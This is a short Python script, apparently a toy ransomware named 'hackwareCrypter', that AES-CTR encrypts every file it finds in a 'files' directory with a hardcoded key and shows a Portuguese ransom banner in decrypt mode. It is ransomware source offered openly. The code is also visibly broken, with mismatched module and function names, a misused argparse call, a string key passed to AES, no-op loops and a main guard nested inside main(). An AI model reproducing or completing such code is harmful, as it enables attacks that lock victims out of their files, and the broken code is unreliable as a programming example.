import crypto
import sys
sys.modules['Crypto'] = crypto
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import discovery
import Crypter

HARDCODED_KEY = 'harckware strike force strikes u!'

def arg_parser():
    parser  = arg_parser.ArgumentParser(description='hackwareCrypter')
    parser.add_argument('-d','--decrypt',help='decripta os arquivos [default: no]',action='store_true')
    return parser


def main():
    parser = get_parser()

    args = vars(parser.parse_args())
    decrypt = args['decrypt']


    if decrypt:
            print('''
                HACKWARE STRIKE FORCE 
                =====================================
                SEUS ARQUIVOS FORAM Cryptogrados.
                Para Descripta-los utilize a seguinte senha '{}'
                '''.format(HARDCODED_KEY))
            key = input('Digite a Senha > ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = AES.new(key,AES.MODE_CTR, Counter=ctr)

    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [init_path]

    for currenDir in startDirs:
        for filename in Discovery.discover(currenDir):
            Crypter.change_files(filename, cryptFn)


    for _ in range(100):
        pass

    if not decrypt:
        pass

    if __name__ == '__main__':
        main()